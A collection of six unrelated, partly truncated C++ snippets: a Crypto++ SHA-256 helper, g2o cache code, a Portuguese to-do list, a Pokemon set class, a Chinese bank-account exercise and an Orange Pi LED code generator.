    "#include \"HashGestion.h\"\r\n\r\nHashGestion::HashGestion()\r\n{\r\n\tstd::cout << \"Constructeur par defautl du Hash\" << std::endl;\r\n}\r\n\r\nHashGestion::~HashGestion()\r\n{\r\n    std::cout << \"Desctructeur par defautl du hasg\" << std::endl;\r\n}\r\n\r\n\r\nstd::string HashGestion::CalculateSHA256(const std::string& input)\r\n{\r\n    CryptoPP::SHA256 hash;\r\n    std::string digest;\r\n\r\n    CryptoPP::StringSource(input, true,\r\n        new CryptoPP::HashFilter(hash,\r\n            new CryptoPP::HexEncoder(\r\n                new CryptoPP::StringSink(digest))));\r\n\r\n    return digest;\r\n}\r\n\r\nstd::string  HashGestion::CalculateFileSHA256(const std::string& filename)\r\n{\r\n    CryptoPP::SHA256 hash;\r\n    std::string hashFile;\r\n\r\n    std::ifstream file(filename, std::ios::binary);\r\n\r\n    if (!file)\r\n    {\r\n        std::cerr << \"Impossible d'ouvrir le fichier.\" << std::endl;\r\n        return \"\";\r\n    }\r\n\r\n    CryptoPP::HashFilter filter(hash, new CryptoPP::HexEncoder(new CryptoPP::StringSink(hashFile)));\r\n\r\n    const size_t bufferSize = 4096; // Taille du bloc de lecture\r\n    CryptoPP::byte buffer[bufferSize]{};\r\n\r\n    while (file.good())\r\n    {\r\n        file.read(reinterpret_cast<char*>(buffer), bufferSize);\r\n        const std::streamsize bytesRead = file.gcount();\r\n\r\n        if (bytesRead > 0)\r\n        {\r\n            filter.Put(buffer, bytesRead);\r\n        }\r\n    }\r\n\r\n    filter.MessageEnd();\r\n    return hashFile;\r\n}\r\n",
    "// g2o - General Graph Optimization\n// Copyright (C) 2011 G. Grisetti, R. Kuemmerle, W. Burgard\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are\n// met:\n//\n// * Redistributions of source code must retain the above copyright notice,\n//   this list of conditions and the following disclaimer.\n// * Redistributions in binary form must reproduce the above copyright\n//   notice, this list of conditions and the following disclaimer in the\n//   documentation and/or other materials provided with the distribution.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS\n// IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED\n// TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A\n// PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n// HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED\n// TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n// PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n// LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n// NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n// SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n#include \"cache.h\"\n#include \"optimizable_graph.h\"\n#include \"factory.h\"\n\n#include <iostream>\n\nnamespace g2o {\n  using namespace std;\n\n  Cache::CacheKey::CacheKey() :\n    _type(), _parameters()\n  {\n  }\n\n  Cache::CacheKey::CacheKey(const std::string& type_, const ParameterVector& parameters_) :\n    _type(type_), _parameters(parameters_)\n  {\n  }\n\n  Cache::Cache(CacheContainer* container_, const ParameterVector& parameters_) :\n    _updateNeeded(true), _parameters(parameters_), _container(container_)\n  {\n  }\n\n  bool Cache::CacheKey::operator<(const Cache::CacheKey& c) const{\n    if (_type < c._type)\n      return true;\n    return std::lexicographical_compare (_parameters.begin( ), _parameters.end( ),\n           c._parameters.begin( ), c._parameters.end( ) );\n  }\n\n\n  OptimizableGraph::Vertex* Cache::vertex() { \n    if (container() ) \n      return container()->vertex(); \n    return 0; \n  }\n\n  OptimizableGraph* Cache::graph() {\n    if (container())\n      return container()->graph();\n    return 0;\n  }\n\n  CacheContainer* Cache::container() {\n    return _container;\n  }\n\n  ParameterVector& Cache::parameters() {\n    return _parameters;\n  }\n  \n  Cache::CacheKey Cache::key() const {\n    Factory* factory=Factory::instance();\n    return CacheKey(factory->tag(this), _parameters);\n  };\n\n  \n  void Cache::update(){\n    if (! _updateNeeded)\n      return;\n    for(std::vector<Cache*>::iterator it=_parentCaches.begin(); it!=_parentCaches.end(); it++){\n      (*it)->update();\n    }\n    updateImpl();\n    _updateNeeded=false;\n  }\n\n  Cache* Cache::installDependency(const std::string& type_, const std::vector<int>& parameterIndices){\n    ParameterVector pv(parameterIndices.size());\n    for (size_t i=0; i<parameterIndices.size(); i++){\n      if (parameterIndices[i]<0 || parameterIndices[i] >=(int)_parameters.size())\n  return 0;\n      pv[i]=_parameters[ parameterIndices[i] ];\n    }\n    CacheKey k(type_, pv);\n    if (!container())\n      return 0;\n    Cache* c=container()->findCache(k);\n    if (!c) {\n      c = container()->createCache(k);\n    }\n    if (c)\n      _parentCaches.push_back(c);\n    return c;\n  }\n  \n  bool Cache::resolveDependancies(){\n    return true;\n  }\n\n  CacheContainer::CacheContainer(OptimizableGraph::Vertex* vertex_) {\n    _vertex = vertex_;\n  }\n\n  Cache* CacheContainer::findCache(const Cache::CacheKey& key) {\n    iterator it=find(key);\n    if (it==end())\n      return 0;\n    return it->second;\n  }\n  \n  Cache* CacheContainer::createCache(const Cache::CacheKey& key){\n    Factory* f = Factory::instance();\n    HyperGraph::HyperGraphElement* e = f->construct(key.type());\n    if (!e) {\n      cerr << __PRETTY_FUNCTION__ << endl;\n      cerr << \"fatal error in creating cache of type \" << key.type() << endl;\n      return 0;\n    }\n    Cache* c = dynamic_cast<Cache*>(e);\n    if (! c){\n      cerr << __PRETTY_FUNCTION__ << endl;\n      cerr << \"fatal error in creating cache of type \" << key.type() << endl;\n      return 0;\n    }\n    c->_container = this;\n    c->_parameters = key._parameters;\n    if (c->resolveDependancies()){\n      insert(make_pair(key,c));\n      c->update();\n      return c;\n    } \n    return 0;\n  }\n  \n  OptimizableGraph::Vertex* CacheContainer::vertex() {\n    return _vertex;\n  }\n\n  OptimizableGraph* CacheContainer::graph(){\n    if (_vertex)\n      return _vertex->graph();\n    return 0;\n  }\n\n  void CacheContainer::update() {\n    for (iterator it=begin(); it!=end(); it++){\n      (it->second)->update();\n    }\n    _updateNeeded=false;\n  }\n\n  void CacheContainer::setUpdateNeeded(bool needUpdate) {\n    _updateNeeded=needUpdate;\n    for",
    "#include <iostream>\n#include <cstdio>\n#include <limits>\n\nusing namespace std;\n\nvoid menu(){\n    cout << \"Este \u00e9 o menu de a\u00e7\u00f5es...\" << endl;\n    cout << \"1 - adicione algo a Lista\" << endl;\n    cout << \"2 - marque se foi feito\" << endl;\n    cout << \"3 - consultar lista\" << endl;\n    cout << \"4 - apagar lista\" << endl;\n    cout << \"5 - sair do menu\" << endl;\n    cout << \"=========================\" << endl;\n    cout << \"Digite sua op\u00e7\u00e3o\" << endl;\n}\n\nint main(){\n    struct lista{\n        char item[100];\n        bool feito = false;\n        int numItem;\n    };\n    struct lista list;\n    int opcMenu, i, itemBusca, opcConsulta, opcApagar;\n    char opc;\n    i = 0;\n    string saber;\n\n    FILE *listaFazer;\n\n    menu();\n    cin >> opcMenu;\n    while(opcMenu != 5){\n\n        switch(opcMenu){\n            case 1:\n                system(\"cls\");\n                cout << \"Deseja adicionar algo a lista? s para sim e n para n\u00e3o\" << endl;\n                cin >> opc;\n                while(opc == 's'){\n                    listaFazer = fopen(\"lista_a_fazer.dat\", \"rb\");\n                    if(fread(&list, sizeof(struct lista), 1, listaFazer) == 1){\n                        while(!feof(listaFazer)){\n                            i = list.numItem;\n                            fread(&list, sizeof(struct lista), 1, listaFazer);\n                        }\n                        fclose(listaFazer);\n                    }\n                    cout << \"i \u00e9: \" << i << endl;\n                    i++;\n                    cout << \"Vamos a adi\u00e7\u00e3o...\" << endl;\n                    cin.get();\n\n                    listaFazer = fopen(\"lista_a_fazer.dat\", \"ab+\");\n                    cout << \"Digite um item: \";\n                    cin >> list.item;\n                    cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n                    list.numItem = i;\n                    cout << \"item \" << i << endl;\n                    fwrite(&list , sizeof(struct lista), 1, listaFazer);\n                    fclose(listaFazer);\n\n                    cout << \"Deseja adicionar algo a mais na lista? s para sim e n para n\u00e3o\" << endl;\n                    cin >> opc;\n\n                }\n                break;\n            case 2:\n                system(\"cls\");\n                cout << \"Deseja marcar algo da lista como feito? s para sim e n para n\u00e3o\" << endl;\n                cin >> opc;\n                while(opc == 's'){\n                    cout << \"Digite o numero do item que voc\u00ea deseja marcar como feito\" << endl;\n                    cin >> itemBusca;\n        \n                       \n                    listaFazer = fopen(\"lista_a_fazer.dat\", \"rb+\");\n                    if(listaFazer == NULL) {\n                        cout << \"Erro ao abrir o arquivo.\" << endl;\n                        break;\n                    }\n\n                        \n                    while(fread(&list, sizeof(struct lista), 1, listaFazer) == 1){\n                        if(itemBusca == list.numItem){\n                           list.feito = true; \n\n                            // Voltar a posi\u00e7\u00e3o do ponteiro para sobrescrever o item atualizado\n                            fseek(listaFazer, -sizeof(struct lista), SEEK_CUR);\n                            fwrite(&list, sizeof(struct lista), 1, listaFazer);  // Escrever a atualiza\u00e7\u00e3o\n\n                            cout << \"Item marcado como feito com sucesso.\" << endl;\n                            break;\n                        }\n                    }\n                    cout << \"Deseja marcar algo da lista como feito? s para sim e n para n\u00e3o\" << endl;\n                    cin >> opc;\n                }\n                break;\n            \n            case 3:\n                system(\"cls\");\n                cout << \"Qual op\u00e7\u00e3o deseja consultar?\" << endl;\n                cout << \"1 - Mostrar toda a lista, Feitos ou n\u00e3o\" << endl;\n                cout << \"2 - Mostrar apenas os que n\u00e3o foram feitos\" << endl;\n                cout << \"3 - Mostrar os que foram feitos\" << endl;\n                cout << \"4 - Sair\" << endl;\n                cin >> opcConsulta;\n\n                while (opcConsulta != 4) {\n                    switch (opcConsulta) {\n                        case 1:\n                            cout << \"Todos os itens!\" << endl << endl;\n                            listaFazer = fopen(\"lista_a_fazer.dat\", \"rb\");\n                            if (listaFazer != NULL) {\n                                while (fread(&list, sizeof(struct lista), 1, listaFazer) == 1) {\n                                    saber = (list.feito) ? \"Feito.\" : \"N\u00e3o Feito.\";\n                                    cout << list.numItem << \" - \" << list.item << \" . \" << saber << endl;\n                                }\n                                fclose(listaFazer);\n                            } else {\n                                cout << \"Erro ao abrir o arquivo.\" << endl;\n                            }\n                            cin.get();\n                            break;\n\n                        case 2:",
    "//\r\n// Created by louis on 09/09/2024.\r\n//\r\n\r\n#include \"SetOfPokemon.h\"\r\n#include <iostream>\r\n#include <fstream>\r\n\r\nvoid SetOfPokemon::displayList() {\r\n    if (arrayOfPokemon.empty()) {  // Check if the array is empty\r\n        std::cout << \"Tu n'as pas de Pokemon\" << std::endl;\r\n    } else {\r\n        for(Pokemon * pokemon : arrayOfPokemon){\r\n            std::cout << \"******* Attrapez-les tous ! *******\" << std::endl;\r\n            pokemon -> displayInfo();\r\n        }\r\n    }\r\n}\r\n\r\nint SetOfPokemon::FindByName(string name){\r\n    for (int i=0; i < arrayOfPokemon.size(); i++){\r\n        if (name == arrayOfPokemon.at(i)->getName()){\r\n            return i;\r\n        }\r\n\r\n    }\r\n    return 0;\r\n}\r\n\r\nint SetOfPokemon::FindById(int id){\r\n    if (id > 721){\r\n        std::cerr << \"Num\u00e9ro de Pokedex introuvable\" << std::endl;\r\n        return -1;\r\n    }\r\n    for (size_t i=0; i < arrayOfPokemon.size(); i++){\r\n        if (id == arrayOfPokemon.at(i)-> getId()){\r\n            return static_cast <int> (i);\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n\r\nSetOfPokemon::SetOfPokemon(){\r\n}",
    "#include<iostream>\r\n#include<string>\r\nusing namespace std;\r\n\r\n/*1\uff09\u8bbe\u8ba1\u4e00\u6570\u636e\u7ed3\u6784\uff0c\u7528\u6765\u8868\u793a\u67d0\u4e00\u94f6\u884c\u50a8\u6237\u7684\u57fa\u672c\u4fe1\u606f\uff1a\r\n\t\u8d26\u53f7(string)\u3001\u59d3\u540d(\u6682\u9ed8\u8ba4E\uff09(string)\u3001\u5f00\u6237\u5e74\u6708\u65e5(struct:int,int,int)\u3001\r\n\t\u50a8\u84c4\u7c7b\u578b(enum)\u3001\u5b58\u5165\u7d2f\u52a0\u6570(double)\u3001\u5229\u606f(double)\u3001\u5e10\u9762\u603b\u6570(double)\u3002\r\n\t\u9644\u52a0\u4fe1\u606f\uff1a\u5bc6\u7801\r\n\r\n2\uff09\u5b9a\u4e49\u9488\u5bf9\u8be5\u94f6\u884c\u50a8\u6237\u57fa\u672c\u4fe1\u606f\u7684\u64cd\u4f5c\uff1a\u589e\u5220\u6539\u67e5\r\n\r\n\u589e\uff1a\u65b0\u5efa\u8d26\u6237\r\n\u5220\uff1a\u5220\u9664\u8d26\u6237\r\n\u6539\uff1a\u66f4\u6539\u5bc6\u7801\u3001\u5b58\u6b3e\u3001\u53d6\u6b3e\r\n\u67e5\uff1a\u67e5\u8be2\u4f59\u989d\u3001\u67e5\u8be2\u5f53\u671f\u5229\u606f\u3001\u67e5\u8be2\u5b58\u5165\u7d2f\u52a0\u6570\u3001\u67e5\u8be2\u8d26\u53f7\r\n*/\r\n\r\n//\u672c\u9898\u4e2d\u5b58\u5165\u7d2f\u52a0\u6570\u5b9a\u4e49\u4e0d\u660e\u786e\uff0c\u6b64\u7cfb\u7edf\u4e2d\u89c6\u4f5c\u67d0\u6bb5\u65f6\u671f\u5185\u73b0\u91d1\u5b58\u5165\u603b\u91cf\uff0c\u4e0d\u8003\u8651\u8f6c\u8d26\u53d8\u52a8\r\n//\u5b58\u5165\u7d2f\u52a0\u6570\u66f4\u65b0\u53ca\u5229\u606f\u5b9a\u671f\u8ba1\u7b97\u529f\u80fd\u672a\u8865\u5168\r\n//\u672c\u4ee3\u7801\u4ec5\u7528\u4e8e\u7ec3\u4e60C++\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\uff0c\u540e\u7eed\u4f5c\u4e1a\u5747\u7531C++\u5b9e\u73b0\r\n\r\nclass Depositor_Basic {\r\npublic:\r\n\tenum Deposit {\r\n\t\tDemand,\r\n\t\tFixed,\r\n\t\tSavings,\r\n\t\tRecurring\r\n\t};\r\n\tstruct Date {\r\n\t\tint year;\r\n\t\tint month;\r\n\t\tint day;\r\n\t};\r\n\tDepositor_Basic();\r\n\tDepositor_Basic(string account, string name, int year, int month, int day, int type, string password);\r\n\tbool Check_Password(string password);\r\n\tvoid Save(double money);//\u5b58\u6b3e\r\n\tbool Draw(double money);//\u53d6\u6b3e\r\n\tdouble Check_Balance() const;//\u67e5\u8be2\u4f59\u989d\r\n\tdouble Check_Interest() const;//\u67e5\u8be2\u5f53\u671f\u5229\u606f\r\n\tdouble Check_Cumulative() const;//\u67e5\u8be2\u5b58\u5165\u7d2f\u52a0\u6570\r\n\tstring Check_Account() const;//\u67e5\u8be2\u8d26\u53f7\r\n\tstring Check_Name() const;//\u67e5\u8be2\u59d3\u540d\r\n\tDate Check_Opening() const;//\u67e5\u8be2\u5f00\u6237\u65e5\u671f\r\n\tDeposit Check_Type() const;//\u67e5\u8be2\u50a8\u84c4\u7c7b\u578b\r\n\tbool Password_Valid(string password) const;//\u5bc6\u7801\u662f\u5426\u5408\u6cd5\r\n\tvoid Change_Password(string password);//\u66f4\u6539\u5bc6\u7801\r\n\tbool Transfer(double money, Depositor_Basic& payee);//\u8f6c\u8d26\r\n\r\nprotected:\r\n\tstring account;\r\n\tstring name;\r\n\tDate opening;\r\n\tDeposit type;\r\n\tdouble cumulative;\r\n\tdouble interest;\r\n\tdouble balance;\r\n\tstring password;\r\n\tvoid Update_Cumulative(double money) {\r\n\t\tcumulative += money;\r\n\t}\r\n\tvoid Update_Interest(double money) {\r\n\t\tinterest += money;\r\n\t}\r\n\tvoid Update_Balance(double money) {\r\n\t\tbalance += money;\r\n\t}\r\n};\r\n\r\nDepositor_Basic::Depositor_Basic() {\r\n}\r\nDepositor_Basic::Depositor_Basic(string account, string name, int year, int month, int day, int type, string password) {\r\n\tthis->account = account;\r\n\tthis->name = name;\r\n\tthis->opening.year = year;\r\n\tthis->opening.month = month;\r\n\tthis->opening.day = day;\r\n\tthis->password = password;\r\n\tthis->type = static_cast<Deposit>(type);\r\n\tthis->cumulative = 0;\r\n\tthis->interest = 0;\r\n\tthis->balance = 0;\r\n}\r\nbool Depositor_Basic::Check_Password(string password) {\r\n\t//\u68c0\u67e5\u5bc6\u7801\r\n\tif (this->password == password) {\r\n\t\treturn true;\r\n\t}\r\n\telse {\r\n\t\treturn false;\r\n\t}\r\n}\r\nvoid Depositor_Basic::Save(double money) {\r\n\t//\u5b58\u6b3e\r\n\tUpdate_Cumulative(money);\r\n\tUpdate_Balance(money);\r\n}\r\n\r\nbool Depositor_Basic::Draw(double money) {\r\n\t//\u53d6\u6b3e\r\n\tif (money > balance) {\r\n\t\treturn false;\r\n\t}\r\n\telse {\r\n\t\tUpdate_Cumulative(-money);\r\n\t\tUpdate_Balance(-money);\r\n\t\treturn true;\r\n\t}\r\n}\r\n\r\ndouble Depositor_Basic::Check_Balance() const {\r\n\t//\u67e5\u8be2\u4f59\u989d\r\n\treturn balance;\r\n}\r\ndouble Depositor_Basic::Check_Interest() const {\r\n\t//\u67e5\u8be2\u5f53\u671f\u5229\u606f\r\n\treturn interest;\r\n}\r\ndouble Depositor_Basic::Check_Cumulative() const {\r\n\t//\u67e5\u8be2\u5b58\u5165\u7d2f\u52a0\u6570\r\n\treturn cumulative;\r\n}\r\nstring Depositor_Basic::Check_Account() const {\r\n\t//\u67e5\u8be2\u8d26\u53f7\r\n\treturn account;\r\n}\r\nstring Depositor_Basic::Check_Name() const {\r\n\t//\u67e5\u8be2\u59d3\u540d\r\n\treturn name;\r\n}\r\nDepositor_Basic::Date Depositor_Basic::Check_Opening() const {\r\n\t//\u67e5\u8be2\u5f00\u6237\u65e5\u671f\r\n\treturn opening;\r\n}\r\nDepositor_Basic::Deposit Depositor_Basic::Check_Type() const {\r\n\t//\u67e5\u8be2\u50a8\u84c4\u7c7b\u578b\r\n\treturn type;\r\n}\r\nbool Depositor_Basic::Password_Valid(string password) const {\r\n\tif (password.size() < 3 || password.size() > 8) {\r\n\t\treturn false;\r\n\t}\r\n\telse\r\n\t{\r\n\t\treturn true;\r\n\t}\r\n}\r\nvoid Depositor_Basic::Change_Password(string password) {\r\n\t//\u66f4\u6539\u59d3\u540d\r\n\tthis->password = password;\r\n}\r\nbool Depositor_Basic::Transfer(double money, Depositor_Basic& payee) {\r\n\t//\u8f6c\u8d26\r\n\tif (money > balance) {\r\n\t\treturn false;\r\n\t}\r\n\telse {\r\n\t\tUpdate_Balance(-money);\r\n\t\tpayee.Update_Balance(money);\r\n\t\treturn true;\r\n\t}\r\n}\r\n//\u6309\u7167\u65f6\u95f4\u987a\u5e8f\u4f7f\u7528\u7ebf\u6027\u8868\u5b58\u50a8\u50a8\u6237\u4fe1\u606f\r\n//\u4e24\u4e2a\u5217\u8868\uff0c\u4e00\u4e2a\u5217\u8868\u88c5account\uff0c\u4e00\u4e2a\u5217\u8868\u88c5Depositor_Basic\u5bf9\u8c61\r\n//\u4f7f\u7528\u7ed3\u6784\u4f53\uff0c\u5b58\u8868\u7684\u7a7a\u95f4\u5927\u5c0f\u548c\u5c3e\u90e8\u6307\u9488\r\nstruct Depositor {\r\n\tDepositor_Basic Depositor_list[10];\r\n\tint last = -1;\r\n}depositor;\r\nstruct Account {\r\n\tstring account_list[10] = { \"0\",\"0\",\"0\",\"0\",\"0\",\"0\",\"0\",\"0\",\"0\",\"0\" };\r\n\tint last = -1;\r\n}account_numbers;\r\n//\u6b64\u5904\u5f85\u4fee\u6539\uff0c\u4ee5\u5b9e\u73b0\u65b0\u5efa\u8d26\u6237\u529f\u80fd\r\n/*Depositor_Basic Depositor_list[2] = {\r\n\tDepositor_Basic(\"111\", \"Alice\", 2005, 3, 5, 0, \"111\"),\r\n\tDepositor_Basic(\"222\", \"Bob\", 2005, 3, 5, 0, \"222\")\r\n};\r\nstring account_list[2] = { Depositor_list[0].Check_Account(), Depositor_list[1].Check_Account()};*/\r\n//\u67e5\u627e\u65f6\uff0c\u904d\u5386account\u5217\u8868\uff0c\u627e\u5230\u5bf9\u5e94\u7684account\uff0c\u8fd4\u56de\u5bf9\u5e94\u7684Depositor_Basic\u5bf9\u8c61\r\n//\u5b9a\u4e49\u6574\u578b\u67e5\u627e\u51fd\u6570\uff0c\u8fd4\u56de\u5bf9\u5e94\u7684Depositor_Basic\u5bf9\u8c61\u7684\u4e0b\u6807+1\uff0c\u5982\u679c\u6ca1\u627e\u5230\u8fd4\u56de0\r\nint Find_Depositor(string account) {\r\n\tfor (int i = 0; i <= depositor.last; i++) {\r\n\t\tif (account_numbers.account_list[i] == account) {\r\n\t\t\treturn i+1;\r\n\t\t}\r\n\t}\r\n\treturn 0;\r\n}\r\nusing namespace std;\r\nvoid run() {\r\n\tcout << \"\u6b22\u8fce\u4f7f\u7528\u94f6\u884c\u50a8\u6237\u4fe1\u606f\u7ba1\u7406\u7cfb\u7edf\uff01\" << endl;\r\n\t//\u9009\u62e9\u529f\u80fd\r\n\tcout << \"\u8bf7\u9009\u62e9\u529f\u80fd\uff1a\" << endl;\r\n\tcout << \"0.\u65b0\u5efa\u8d26\u6237\" << endl;\r\n\tcout << \"1.\u5b58\u6b3e\" << endl;\r\n\tcout << \"2.\u53d6\u6b3e\" << endl;\r\n\tcout << \"3.\u67e5\u8be2\u4f59\u989d\" << endl;\r\n\tcout << \"4.\u67e5\u8be2\u5f53\u671f\u5229\u606f\" << endl;\r\n\tcout << \"5.\u67e5\u8be2\u5b58\u5165\u7d2f\u52a0\u6570\" << endl;\r\n\tcout << \"6.\u66f4\u6539\u5bc6\u7801\" << endl;\r\n\tcout << \"7.\u8f6c\u8d26\" << endl;\r\n\tcout << \"8.\u5220\u9664\u8d26\u6237\" << endl;\r\n\tenum Function {\r\n\t\tCreate,\r\n\t\tSave,\r\n\t\tDraw,\r\n\t\tCheck_Balance,\r\n\t\tCheck_Interest,\r\n\t\tCheck_Cumulative,\r\n\t\tChange_Password,\r\n\t\tTransfer,\r\n\t\tDelete_Account\r\n\t};\r\n\r\n\tint choice_int;\r\n\tcin >> choice_int;\r\n\tFunction choice = stati",
    "#include <windows.h>\r\n#include <fstream>\r\n#include <bits/stdc++.h> \r\nusing namespace std;\r\nint main(){\r\nstring ip; \r\nint arr[100];\r\nint x; \r\n\tstring nemef;\r\n \tsystem(\"cls\");\r\n\tcout<<\"\u8f93\u5165\u9999\u6a59\u6d3eIP\u5730\u5740\";\r\n\tcin>>ip; \r\n\twhile(true){\r\n\t\tsystem(\"cls\");\r\n\t\tcout<<\"\u9999\u6a59\u6d3eC++\u811a\u672c\u7b80\u6613\u7f16\u7a0b\u5668v1.0\"<<endl<<endl;\r\n\t\t\t\tcout<<\"1.\u6253\u5f00\u7eff\u8272led\u706f\"<<endl;\r\n\t\t\t\tcout<<\"2.\u6253\u5f00\u7ea2\u8272led\u706f\"<<endl;\r\n\t\t\t\tcout<<\"3.\u5173\u95ed\u7eff\u8272led\u706f\"<<endl;\r\n\t\t\t\tcout<<\"4.\u5173\u95ed\u7ea2\u8272led\u706f\"<<endl;\r\n\t\t\t\tcout<<\"5.\u5ef6\u65f61\u79d2\"<<endl;\r\n\t\t\t\tcout<<\"6.GPIO26\u8f93\u51fa\u9ad8\u7535\u5e73\"<<endl;\r\n\t\t\t\tcout<<\"7.GPIO26\u8f93\u51fa\u4f4e\u7535\u5e73\"<<endl;\r\n\t\t\t\tcout<<\"8.\u4fdd\u5b58\u66f4\u6539\u5e76\u4e0a\u4f20\u5230\u9999\u6a59\u6d3e\"<<endl;\r\n\t\t\t\tcout<<\"9.\u5220\u9664\u4e0a\u4e00\u9879\"<<endl;\r\n\t\t\t\tcout<<\"10.\u7eff\u8272led\u706f\u95ea\u70c1\"<<endl;\r\n\t\t\t\tcout<<\"11.\u7ea2\u8272led\u706f\u95ea\u70c1\"<<endl<<endl;\r\n\t\t\t\tif(x>0){\r\n\t\t\t\tcout<<\"\u4ee5\u4e0b\u4e3a\u4f60\u7f16\u5199\u7684\u7a0b\u5e8f\"<<endl<<endl;\r\n\t\t\t}\r\n\t\tfor(int i=1;x>=i;i++){\r\n\t\t\tint hchc=arr[i];\r\n\t\t\tcout<<i<<\".\";\r\n\t\t\tif(hchc==1){\r\n\t\t\t\tcout<<\"\u6253\u5f00\u7eff\u8272led\u706f\"<<endl;\r\n\t\t\t}\r\n\t\t\tif(hchc==2){\r\n\t\t\t\tcout<<\"\u6253\u5f00\u7ea2\u8272led\u706f\"<<endl;\r\n\t\t\t}\r\n\t\t\tif(hchc==3){\r\n\t\t\t\tcout<<\"\u5173\u95ed\u7eff\u8272led\u706f\"<<endl;\r\n\t\t\t}\r\n\t\t\tif(hchc==4){\r\n\t\t\t\tcout<<\"\u5173\u95ed\u7ea2\u8272led\u706f\"<<endl;\r\n\t\t\t}\r\n\t\t\tif(hchc==5){\r\n\t\t\t\tcout<<\"\u5ef6\u65f61\u79d2\"<<endl;\r\n\t\t\t}\r\n\t\t\tif(hchc==6){\r\n\t\t\t\tcout<<\"GPIO26\u8f93\u51fa\u9ad8\u7535\u5e73\"<<endl;\r\n\t\t\t}\r\n\t\t\tif(hchc==7){\r\n\t\t\t\tcout<<\"GPIO26\u8f93\u51fa\u4f4e\u7535\u5e73\"<<endl;\r\n\t\t\t}\r\n\t\t\tif(hchc==10){\r\n\t\t\t\tcout<<\"\u7eff\u8272led\u706f\u95ea\u70c1\"<<endl;\r\n\t\t\t}\r\n\t\t\tif(hchc==11){\r\n\t\t\t\tcout<<\"\u7ea2\u8272led\u706f\u95ea\u70c1\"<<endl;\r\n\t\t\t}\r\n\t\t}\r\n\t\tcout<<endl<<\"\u4e0b\u4e00\u6b21\u8981\u6267\u884c\u7684\u4ee3\u7801:\"; \r\n\t\tint hc;\r\n\t\tcin>>hc;\r\n\t\tif((hc<=7&&hc>=0)||hc==10||hc==11){\r\n\t\t\tarr[x+1]=hc;\r\n\t\t\tx++;\r\n\t\t}\r\n\t\telse if(hc==9&&x>0){\r\n\t\t\tarr[x]==0;\r\n\t\t\tx--;\r\n\t\t}\r\n\t\telse if(hc==8){\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tcout<<\"\u6587\u4ef6\u540d:\";\r\n\t\t\tcin>>nemef;\r\n\t\t    std::ofstream fileStream(nemef.c_str());\r\n        fileStream << \"#include <fstream>\\n\";\r\nfileStream << \"#include <string>\\n\";\r\nfileStream << \"#include <chrono>\\n\";\r\nfileStream << \"#include <thread>\\n\";\r\nfileStream << \"#include <iostream>\\n\";\r\nfileStream << \"#define OUTPUT 0\\n\";\r\nfileStream << \"#define INPUT 1\\n\";\r\nfileStream << \"#define HIGH 1\\n\";\r\nfileStream << \"#define LOW 0\\n\";\r\nfileStream << \"#define GREENLED 1\\n\";\r\nfileStream << \"#define REDLED 0\\n\";\r\nfileStream << \"#define HEARTBAET 2\\n\";\r\nfileStream << \"void digitalLed(bool id,int m){\\n\";\r\nfileStream << \"    if(m==1){\\n\";\r\nfileStream << \"        if(id){\\n\";\r\nfileStream << \"            std::ofstream outfile(\\\"/sys/class/leds/green_led/trigger\\\");\\n\";\r\nfileStream << \"            outfile << \\\"default-on\\\" << \\\"\\\\n\\\"; \\n\";\r\nfileStream << \"            outfile.close();  \\n\";\r\nfileStream << \"        }\\n\";\r\nfileStream << \"        else{\\n\";\r\nfileStream << \"            std::ofstream outfile(\\\"/sys/class/leds/red_led/trigger\\\");\\n\";\r\nfileStream << \"            outfile << \\\"default-on\\\" << \\\"\\\\n\\\"; \\n\";\r\nfileStream << \"            outfile.close();  \\n\";\r\nfileStream << \"        }\\n\";\r\nfileStream << \"    }\\n\";\r\nfileStream << \"    else if(m==0){\\n\";\r\nfileStream << \"        if(id){\\n\";\r\nfileStream << \"            std::ofstream outfile(\\\"/sys/class/leds/green_led/trigger\\\");\\n\";\r\nfileStream << \"            outfile << \\\"none\\\" << \\\"\\\\n\\\"; \\n\";\r\nfileStream << \"            outfile.close();  \\n\";\r\nfileStream << \"        }\\n\";\r\nfileStream << \"        else{\\n\";\r\nfileStream << \"            std::ofstream outfile(\\\"/sys/class/leds/red_led/trigger\\\");\\n\";\r\nfileStream << \"            outfile << \\\"none\\\" << \\\"\\\\n\\\"; \\n\";\r\nfileStream << \"            outfile.close();  \\n\";\r\nfileStream << \"        }\\n\";\r\nfileStream << \"    }\\n\";\r\nfileStream << \"    else if(m==2){\\n\";\r\nfileStream << \"        if(id){\\n\";\r\nfileStream << \"            std::ofstream outfile(\\\"/sys/class/leds/green_led/trigger\\\");\\n\";\r\nfileStream << \"            outfile << \\\"heartbeat\\\" << \\\"\\\\n\\\"; \\n\";\r\nfileStream << \"            outfile.close();  \\n\";\r\nfileStream << \"        }\\n\";\r\nfileStream << \"        else{\\n\";\r\nfileStream << \"            std::ofstream outfile(\\\"/sys/class/leds/red_led/trigger\\\");\\n\";\r\nfileStream << \"            outfile << \\\"heartbeat\\\" << \\\"\\\\n\\\"; \\n\";\r\nfileStream << \"            outfile.close();  \\n\";\r\nfileStream << \"        }\\n\";\r\nfileStream << \"    }\\n\";\r\nfileStream << \"}\\n\";\r\nfileStream << \"void pinMode(int id,bool mode){\\n\";\r\nfileStream << \"    if(mode){\\n\";\r\nfileStream << \"        std::ofstream 